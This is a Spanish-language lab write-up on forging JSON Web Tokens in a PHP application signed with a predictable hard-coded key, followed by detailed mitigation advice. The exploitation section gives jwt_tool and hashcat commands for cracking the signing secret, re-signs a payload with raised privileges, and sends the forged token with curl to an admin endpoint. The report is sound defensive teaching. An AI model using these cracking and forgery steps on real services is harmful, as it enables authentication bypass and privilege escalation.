# Manipulación de JWT 

JWT (JSON Web Token) es un estándar para la autenticación y el intercambio de información de forma segura a través de tokens firmados. Sin embargo, si se implementa incorrectamente, puede ser vulnerable a ataques de falsificación de firmas.´

# Informe: Explotación y Mitigación de Vulnerabilidades JWT

## Vulnerabilidades Identificadas

### Clave de Firma Débil (Weak Signing Key)

- **CVE relacionado**: CWE-321 (Use of Hard-coded Cryptographic Key)
- **Descripción**: La clave de firma se genera como `$key = hash("sha256", "example_key")`, derivada de un string predecible. Esto hace la clave adivinable mediante diccionario o brute force.
- **Impacto**: Bypass de autenticación y escalada de privilegios.

### Algoritmo "none" (Secundaria)

- **Descripción**: Si el servidor no valida el algoritmo estrictamente, un atacante puede enviar un token sin firma con `"alg":"none"`.
- **Impacto**: Acceso no autorizado sin necesidad de conocer la clave.

### Vendor Desactualizado (Secundaria)

- **Descripción**: Versiones de Firebase PHP-JWT < 6.0.0 tratan el algoritmo "none" como válido.
- **CVE**: CVE-2021-46743

---

## Proceso de Explotación

### Reconocimiento

Ejecución de `jwt_weak.php` genera el siguiente JWT:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
7RRmex5UAPvci4-oZA5_y76a6Lp6Mk2IQ4nSm5YGsTg
```

### Análisis del Token

Decodificado en jwt.io:

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**Payload:**
```json
{
  "user": "admin",
  "role": "admin"
}
```

### Obtención de la Clave

Inspeccionando el código fuente:
```php
$key = hash("sha256", "example_key"); // Clave débil
```

Clave derivada (SHA256 de `"example_key"`):
```
6f2e984d66f5b76e3f14736ecfdc4f8e2c3b8b2a745a2a5b3e9f2e1d4c5b6a7e
```

Verificación con herramientas:
```bash
# jwt_tool
python jwt_tool.py "<TOKEN>" -C -d jwt.secrets.list

# hashcat brute force
hashcat -m 16500 -a 3 jwt.hash ?a?a?a?a?a?a?a?a -i --increment-min=4 -w 3
```

### Modificación del Token

En jwt.io (JWT Encoder):

**Payload modificado:**
```json
{
  "user": "admin",
  "role": "superadmin"
}
```

**Clave:** `6f2e984d66f5b76e3f14736ecfdc4f8e2c3b8b2a745a2a5b3e9f2e1d4c5b6a7e`

**Resultado:** Valid secret → Nuevo JWT firmado generado.

### Explotación
```bash
curl -H "Authorization: Bearer <JWT_MALICIOSO>" http://lab/admin
```

---

## Evidencias

| Prueba | Resultado | Impacto |
|--------|-----------|---------|
| Token original decodificado | Payload visible sin clave | Info disclosure |
| Clave obtenida por inspección PHP | SHA256("example_key") | Confirmación clave débil |
| Token modificado (superadmin) | Verified en jwt.io | Escalada de privilegios |
| Acceso a `/admin` | Concedido con JWT falso | Bypass autenticación total |

---

## Medidas de Mitigación

### Clave de Firma Segura
```php
// MAL - Nunca hacer esto
$key = hash("sha256", "example_key");

// BIEN - Clave aleatoria de 64 bytes desde variable de entorno
$key = $_ENV['JWT_SECRET']; // Generada con: base64_encode(random_bytes(64))
```

### Usar Algoritmo Asimétrico (RS256)
```php
// Más seguro: clave privada para firmar, pública para verificar
$privateKey = file_get_contents('/ruta/privada/private.pem');
$jwt = JWT::encode($payload, $privateKey, 'RS256');
```

### Validación Estricta
```php
// Especificar algoritmos permitidos explícitamente
$decoded = JWT::decode($token, new Key($key, 'HS256'));

// Añadir claims de seguridad
$payload = [
    "user" => "admin",
    "role" => "admin",
    "iat"  => time(),
    "exp"  => time() + 3600,   // Expiración 1h
    "iss"  => "mi-app.com",    // Emisor
    "jti"  => uniqid()         // ID único (anti-replay)
];
```

### Resumen de Buenas Prácticas

| Práctica | Implementación |
|----------|----------------|
| Clave fuerte | `random_bytes(64)` + variable de entorno |
| Algoritmo seguro | RS256 (asimétrico) en lugar de HS256 |
| Claims obligatorios | `exp`, `iat`, `iss`, `jti` |
| Blacklist tokens | Redis/DB para tokens revocados |
| Biblioteca actualizada | Firebase PHP-JWT `^7.0+` |
| Algoritmo "none" deshabilitado | Validación estricta de `alg` |

---

## Conclusión

La vulnerabilidad principal radica en el uso de una clave de firma predecible derivada de un string hardcodeado. Esto permite a un atacante:

1. Obtener la clave por inspección del código o brute force.
2. Generar tokens JWT fraudulentos con privilegios elevados.
3. Bypassear completamente el sistema de autenticación.

- **Criticidad**: Alta
- **CVSS Score estimado**: 8.8 (High)
- **Remediación**: Inmediata — cambiar clave a valor aleatorio seguro.